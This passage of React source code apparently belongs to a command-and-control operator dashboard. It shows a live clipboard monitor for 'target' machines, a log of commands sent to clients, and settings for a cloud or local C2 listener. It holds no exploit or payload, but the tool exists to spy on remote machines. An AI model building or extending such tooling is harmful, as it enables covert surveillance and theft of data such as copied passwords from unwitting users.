                      onClick={() => executeCommand(isWatching ? 'clipstop' : 'clipwatch')}
                      disabled={clients.length === 0}
                      className={`px-3 py-1.5 text-xs font-semibold rounded-md flex items-center space-x-1.5 border transition-colors disabled:opacity-40 disabled:cursor-not-allowed ${
                        isWatching
                          ? 'bg-rose-500/10 text-rose-400 border-rose-500/30 hover:bg-rose-500/20'
                          : 'bg-emerald-500/10 text-emerald-400 border-emerald-500/30 hover:bg-emerald-500/20'
                      }`}
                    >
                      <span className={`w-1.5 h-1.5 rounded-full ${isWatching ? 'bg-rose-400 animate-pulse' : 'bg-emerald-400'}`} />
                      <span>{isWatching ? 'Stop Monitor' : 'Start Monitor'}</span>
                    </button>
                  </div>
                </div>

                {isWatching && (
                  <div className="flex items-center space-x-2 px-3 py-2 bg-emerald-500/5 border border-emerald-500/20 rounded-lg text-[11px] text-emerald-400">
                    <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse shrink-0" />
                    <span>Live clipboard monitor is active — every clipboard change on the target will appear below</span>
                  </div>
                )}

                <div className="flex-1 bg-c2card border border-c2border rounded-xl overflow-y-auto">
                  {clipEntries.length === 0 ? (
                    <div className="h-full flex flex-col items-center justify-center space-y-3 text-slate-500 p-12">
                      <Clipboard className="w-10 h-10 opacity-20" />
                      <div className="text-xs text-center space-y-1">
                        <p className="font-semibold">No clipboard data yet</p>
                        <p className="text-slate-600">Use <span className="font-mono text-slate-400">Grab Once</span> for a one-time capture, or <span className="font-mono text-slate-400">Start Monitor</span> to stream changes live</p>
                      </div>
                    </div>
                  ) : (
                    <div className="divide-y divide-c2border">
                      {clipEntries.map((entry) => (
                        <div key={entry.id} className="p-3.5 hover:bg-c2pill/40 transition-colors group">
                          <div className="flex items-start justify-between gap-3">
                            <div className="flex items-start space-x-2.5 min-w-0 flex-1">
                              <div className="mt-0.5 p-1.5 rounded-md bg-amber-500/10 border border-amber-500/20 shrink-0">
                                <Clipboard className="w-3 h-3 text-amber-400" />
                              </div>
                              <div className="min-w-0 flex-1">
                                <div className="flex items-center space-x-2 mb-1">
                                  <span className="text-[9px] font-bold uppercase tracking-wider px-1.5 py-0.5 rounded bg-amber-500/10 border border-amber-500/20 text-amber-400">CLIPBOARD</span>
                                  <span className="text-[10px] font-mono text-slate-500">{entry.client}</span>
                                  <span className="text-[10px] font-mono text-slate-600">{entry.timestamp.split(' ')[1] || entry.timestamp}</span>
                                </div>
                                <pre className="text-xs text-slate-200 font-mono whitespace-pre-wrap break-all leading-relaxed max-h-32 overflow-y-auto">{entry.content}</pre>
                              </div>
                            </div>
                            <button
                              onClick={() => navigator.clipboard.writeText(entry.content)}
                              className="shrink-0 p-1.5 rounded-md text-slate-500 hover:text-white hover:bg-c2pill border border-transparent hover:border-c2border transition-colors opacity-0 group-hover:opacity-100"
                              title="Copy to local clipboard"
                            >
                              <Copy className="w-3 h-3" />
                            </button>
                          </div>
                        </div>
                      ))}
                    </div>
                  )}
                </div>

                <div className="text-[10px] text-slate-600 font-mono">
                  {clipEntries.length} capture{clipEntries.length !== 1 ? 's' : ''} recorded this session
                </div>
              </div>
            );
          })()}

          {/* 7. DATABASE */}
          {activeTab === 'database' && (
            <div className="space-y-4">
              <h2 className="text-lg font-bold">Command Logs</h2>
              <div className="bg-c2card border border-c2border rounded overflow-hidden">
                <table className="w-full text-left border-collapse">
                  <thead>
                    <tr className="border-b border-c2border bg-slate-900/50 text-xs text-slate-400">
                      <th className="p-3">ID</th>
                      <th className="p-3">Client</th>
                      <th className="p-3">Command</th>
                      <th className="p-3">Timestamp</th>
                      <th className="p-3">Status</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-c2border text-sm font-mono text-xs">
                    {logs.map((l, i) => (
                      <tr key={i} className="hover:bg-slate-800/50">
                        <td className="p-3">#{l.id}</td>
                        <td className="p-3 text-c2accent">{l.client_id}</td>
                        <td className="p-3">{l.command}</td>
                        <td className="p-3 text-slate-400">{l.timestamp}</td>
                        <td className="p-3 text-emerald-400">{l.status}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          )}

          {/* 8. SETTINGS */}
          {activeTab === 'settings' && (
            <div className="space-y-5 max-w-2xl">
              <div>
                <h2 className="text-sm font-bold text-white uppercase tracking-wider">C2 Server Configuration</h2>
                <p className="text-[11px] text-slate-400 mt-0.5">Manage your remote cloud C2 connection or switch to local standalone mode</p>
              </div>

              {/* Mode Selection Card */}
              <div className="bg-c2card border border-c2border rounded-xl p-5 shadow-card space-y-4">
                <div>
                  <label className="text-xs font-bold text-white uppercase tracking-wider block mb-2">Connection Mode</label>
                  <div className="grid grid-cols-2 gap-3">
                    <button
                      onClick={() => { setC2Mode('cloud'); localStorage.setItem('c2_mode', 'cloud'); }}
                      className={`p-3.5 rounded-lg border text-left transition-all ${
                        c2Mode === 'cloud'
                          ? 'bg-[#1A2235] border-c2accent shadow-sm'
                          : 'bg-c2pill/50 border-c2border hover:border-c2borderlight text-slate-400'
                      }`}
                    >
                      <div className="flex items-center justify-between mb-1">
                        <span className="text-xs font-bold text-white">☁️ Render Cloud Remote</span>
                        {c2Mode === 'cloud' && <span className="px-1.5 py-0.5 rounded text-[9px] font-bold bg-c2accent text-white">ACTIVE</span>}
                      </div>
                      <p className="text-[11px] text-slate-400">Connect to your live HTTPS server on Render to manage remote fleet anywhere.</p>
                    </button>

                    <button
                      onClick={() => { setC2Mode('local'); localStorage.setItem('c2_mode', 'local'); }}
                      className={`p-3.5 rounded-lg border text-left transition-all ${
                        c2Mode === 'local'
                          ? 'bg-[#1A2235] border-c2accent shadow-sm'
                          : 'bg-c2pill/50 border-c2border hover:border-c2borderlight text-slate-400'
                      }`}
                    >
                      <div className="flex items-center justify-between mb-1">
                        <span className="text-xs font-bold text-white">💻 Local Standalone</span>
                        {c2Mode === 'local' && <span className="px-1.5 py-0.5 rounded text-[9px] font-bold bg-c2accent text-white">ACTIVE</span>}
                      </div>
                      <p className="text-[11px] text-slate-400">Run embedded C2 listener directly on your machine on port 443.</p>
                    </button>
                  </div>
                </div>

                {/* Cloud Server URL + Token */}
                {c2Mode === 'cloud' && (
                  <div className="space-y-3 pt-3 border-t border-c2border/60">
                    <div>
                      <label className="block text-xs font-bold text-slate-300 mb-1.5">Render Cloud C2 Endpoint URL</label>
                      <div className="flex items-center space-x-2">
                        <input
                          type="text"
                          value={c2ServerUrl}
                          onChange={(e) => setC2ServerUrl(e.target.value)}
                          placeholder="https://your-c2-service.onrender.com"
                          className="flex-1 bg-c2bg border border-c2border focus:border-c2accent rounded-md px-3 py-2 text-xs font-mono text-white outline-none transition-colors"
                        />
                        <button
                          onClick={() => {
                            localStorage.setItem('c2_server_url', c2ServerUrl.trim());
                            showToast('Server URL saved successfully! Reconnecting to cloud...');
                          }}
                          className="px-3.5 py-2 bg-c2accent hover:bg-blue-600 text-white rounded-md text-xs font-bold transition-colors shadow-sm"
                        >
                          Save & Connect
                        </button>
                      </div>
                    </div>

                    <div>
                      <label className="block text-xs font-bold text-slate-300 mb-1.5">Operator Token</label>
                      <div className="flex items-center space-x-2">
                        <input
                          type="password"
                          value={c2OperatorToken}
                          onChange={(e) => setC2OperatorToken(e.target.value)}
                          placeholder="Enter your OPERATOR_TOKEN from .env"
                          className="flex-1 bg-c2bg border border-c2border focus:border-c2accent rounded-md px-3 py-2 text-xs font-mono text-white outline-none transition-colors"
                        />
                        <button
                          onClick={() => {
                            localStorage.setItem('c2_operator_token', c2OperatorToken.trim());
                            showToast('Operator token saved! Reconnecting to cloud...');
                          }}
                          className="px-3.5 py-2 bg-c2accent hover:bg-blue-600 text-white rounded-md text-xs font-bold transition-colors shadow-sm"
                        >
                          Save Token
                        </button>
                      </div>
                    </div>

                    <div className="flex items-center space-x-2 text-xs">
                      <span className="text-slate-400">Connection Status:</span>
                      <span className={`px-2 py-0.5 rounded text-[10px] font-bold flex items-center space-x-1.5 ${
                        c2ConnectionStatus === 'connected'
                          ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20'
                          : c2ConnectionStatus === 'error'
                            ? 'bg-red-500/10 text-red-400 border border-red-500/20'
                            : 'bg-amber-500/10 text-amber-400 border border-amber-500/20'
                      }`}>
                        <span className={`h-1.5 w-1.5 rounded-full ${
                          c2ConnectionStatus === 'connected' ? 'bg-emerald-400' :
                          c2ConnectionStatus === 'error' ? 'bg-red-400' : 'bg-amber-400 animate-pulse'
                        }`} />
                        {c2ConnectionStatus === 'connected' ? 'CONNECTED' :
                         c2ConnectionStatus === 'error' ? 'ERROR' : 'CONNECTING...'}
                      </span>
                    </div>
                  </div>
                )}
              </div>
            </div>
          )}

        </div>
      </div>

      {/* ==================== PREVIEW MODAL ==================== */}
      <PreviewModal
        previewOpen={previewOpen}
        previewData={previewData}
        isPreviewLoading={isPreviewLoading}
        previewZoom={previewZoom}
        setPreviewZoom={setPreviewZoom}
        copiedPath={copiedPath}
        setCopiedPath={setCopiedPath}
        setPreviewOpen={setPreviewOpen}
      />

      {/* ==================== TOAST ==================== */}
      {toastMessage && (
        <div className="fixed bottom-6 right-6 z-50 flex items-center space-x-2.5 bg-[#1A2235] border border-c2accent text-white px-4 py-3 rounded-xl shadow-2xl animate-fade-in text-xs font-medium">
          <div className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></div>
          <span>{toastMessage}</span>
        </div>
      )}

    </div>
  );
}
